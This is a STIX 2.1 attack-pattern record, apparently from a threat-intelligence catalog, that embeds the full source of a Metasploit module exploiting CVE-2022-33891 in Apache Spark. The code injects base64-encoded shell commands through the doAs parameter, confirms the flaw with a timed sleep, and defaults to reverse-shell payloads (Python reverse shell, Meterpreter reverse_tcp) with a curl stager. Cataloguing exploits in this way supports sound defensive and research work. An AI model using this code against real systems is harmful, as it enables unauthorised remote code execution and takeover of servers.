{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b1ebe99d-edf4-49bd-b733-cda84d95a805",
    "created": "2024-08-14T17:02:54.583786Z",
    "modified": "2024-08-14T17:02:54.58379Z",
    "name": "Apache Spark Unauthenticated Command Injection RCE",
    "description": " This module exploits an unauthenticated command injection vulnerability in Apache Spark. Successful exploitation results in remote code execution under the context of the Spark application user.  The command injection occurs because Spark checks the group membership of the user passed in the ?doAs parameter by using a raw Linux command.  It is triggered by a non-default setting called spark.acls.enable. This configuration setting spark.acls.enable should be set true in the Spark configuration to make the application vulnerable for this attack.  Apache Spark versions 3.0.3 and earlier, versions 3.1.1 to 3.1.2, and versions 3.2.0 to 3.2.1 are affected by this vulnerability.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/apache_spark_rce_cve_2022_33891.rb",
            "external_id": "apache_spark_rce_cve_2022_33891.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-33891"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/stopwatch'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache Spark Unauthenticated Command Injection RCE',\n        'Description' => %q{\n          This module exploits an unauthenticated command injection vulnerability in Apache Spark.\n          Successful exploitation results in remote code execution under the context of the Spark application user.\n\n          The command injection occurs because Spark checks the group membership of the user passed\n          in the ?doAs parameter by using a raw Linux command.\n\n          It is triggered by a non-default setting called spark.acls.enable.\n          This configuration setting spark.acls.enable should be set true in the Spark configuration to make the application vulnerable for this attack.\n\n          Apache Spark versions 3.0.3 and earlier, versions 3.1.1 to 3.1.2, and versions 3.2.0 to 3.2.1 are affected by this vulnerability.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Kostya Kortchinsky', # Security researcher and discovery of the vulnerability\n          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # Author & Metasploit module\n        ],\n        'References' => [\n          ['URL', 'https://lists.apache.org/thread/p847l3kopoo5bjtmxrcwk21xp6tjxqlc'], # Disclosure\n          ['URL', 'https://attackerkb.com/topics/5FyKBES4BL/cve-2022-33891'], # Analysis\n          ['CVE', '2022-33891']\n        ],\n        'DefaultOptions' => {\n          'SSL' => false,\n          'WfsDelay' => 5\n        },\n        'Platform' => %w[unix linux],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Targets' => [\n          [\n            'Unix (In-Memory)',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :in_memory,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_python'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :dropper,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'CmdStagerFlavor' => ['printf', 'curl'],\n        'DefaultTarget' => 0,\n        'Privileged' => false,\n        'DisclosureDate' => '2022-07-18',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [true, 'The URI of the vulnerable instance', '/'])\n      ]\n    )\n  end\n\n  def execute_command(cmd, _opts = {})\n    b64 = Rex::Text.encode_base64(cmd)\n    post_data = \"doAs=\\`echo #{b64} | base64 -d | bash\\`\"\n\n    return send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/'),\n      'data' => post_data\n    })\n  rescue Rex::ConnectionRefused, Rex::HostUnreachable, Rex::ConnectionTimeout, Errno::ETIMEDOUT => e\n    elog(\"A communication error occurred: #{e.message}\", error: e)\n  end\n\n  def check\n    print_status(\"Checking if #{peer} can be exploited!\")\n\n    res = execute_command(\"echo #{Rex::Text.rand_text_alpha_lower(8..12)}\")\n\n    return CheckCode::Unknown('Did not receive a response from target.') unless res\n\n    if res.code != 403\n      return CheckCode::Safe('Target did not respond with a 403 response.')\n    end\n\n    sleep_time = rand(5..10)\n    print_status(\"Performing command injection test issuing a sleep command of #{sleep_time} seconds.\")\n\n    res, elapsed_time = Rex::Stopwatch.elapsed_time do\n      execute_command(\"sleep #{sleep_time}\")\n    end\n\n    print_status(\"Elapsed time: #{elapsed_time} seconds.\")\n\n    unless res && elapsed_time >= sleep_time\n      return CheckCode::Safe('Failed to test command injection.')\n    end\n\n    CheckCode::Vulnerable('Successfully tested command injection.')\n  end\n\n  def exploit\n    print_status('Exploiting...')\n    case target['Type']\n    when :in_memory\n      execute_command(payload.encoded)\n    when :dropper\n      execute_cmdstager(linemax: 1024) # set an appropriate :linemax dependent upon available space\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-07-18",
    "x_mitre_platforms": [
        "linux'"
    ]
}